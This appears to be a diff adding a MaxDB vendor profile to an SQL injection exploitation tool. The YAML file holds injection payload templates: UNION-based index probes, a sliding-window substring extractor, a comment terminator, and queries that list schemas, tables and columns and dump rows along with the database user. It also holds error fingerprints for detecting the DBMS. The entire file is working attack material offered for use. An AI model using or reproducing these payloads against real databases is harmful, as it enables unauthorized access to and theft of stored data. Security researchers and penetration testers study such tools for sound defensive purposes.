@@ -1,0 +1,122 @@
+vendor: ""
+resource: 
+ info: |
+  SELECT 
+      '-'
+      || id
+      || '${ENCLOSE_VALUE_SQL}'
+      || DATABASE()
+      || '${ENCLOSE_VALUE_SQL}'
+      || user()
+      || '${TRAIL_SQL}'
+      r
+  from sysinfo.VERSION
+ schema: 
+  database: |
+   select 
+       rr
+       || '${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(t.schemaname)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from
+           (select distinct schemaname from SCHEMAS) t,
+           (select distinct schemaname from SCHEMAS) t1
+       where t.schemaname >= t1.schemaname
+       group by t.schemaname
+       {limit}
+   ) a
+  table: |
+   select 
+       rr
+       || '${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(t.tablename)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from
+           (select distinct tablename from TABLES where SCHEMANAME = '${DATABASE}') t,
+           (select distinct tablename from TABLES where SCHEMANAME = '${DATABASE}') t1
+       where t.tablename >= t1.tablename
+       group by t.tablename
+       {limit}
+   ) a
+  column: |
+   select 
+       rr
+       || '${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(t.COLUMNNAME)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+       from
+           (select distinct COLUMNNAME from COLUMNS where SCHEMANAME = '${DATABASE}'and TABLENAME = '${TABLE}') t,
+           (select distinct COLUMNNAME from COLUMNS where SCHEMANAME = '${DATABASE}'and TABLENAME = '${TABLE}') t1
+       where t.COLUMNNAME >= t1.COLUMNNAME
+       group by t.COLUMNNAME
+       {limit}
+   ) a
+  row: 
+   query: |
+    select 
+        rr
+        || '${TRAIL_SQL}'
+        r
+    from (
+        select 
+            '${ENCLOSE_VALUE_SQL}'
+            || trim(t.s)
+            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            rr
+        from 
+            (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t,
+            (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t1
+        where t.s >= t1.s
+        group by t.s
+        {limit}
+    ) a
+   fields: 
+    field: "trim(ifnull(chr(${FIELD}), ''))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select 
+       '${LEAD}'
+       ||SUBSTR(
+           r,
+           ${INDEX},
+           1500
+       )
+   from (
+       ${INJECTION}
+   ) x
+  limit: "having count(*) between ${LIMIT} and ${LIMIT}"
+  failsafe: "select (1337${INDICE}7330%2b1) r from dual"
+  calibrator: |
+   rpad(
+       '${CALIBRATOR_SQL}', 
+       1024, 
+       '${CALIBRATOR_SQL}', 
+       1025
+   )
+  limitBoundary: 1
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "Warning: maxdb::"
+    - "maxdb.query"
+    - "): Invalid end of SQL statement"
+ normal: 
+  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE})z"
+  capacity: "(select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)"
+  orderBy: "order by 1337"
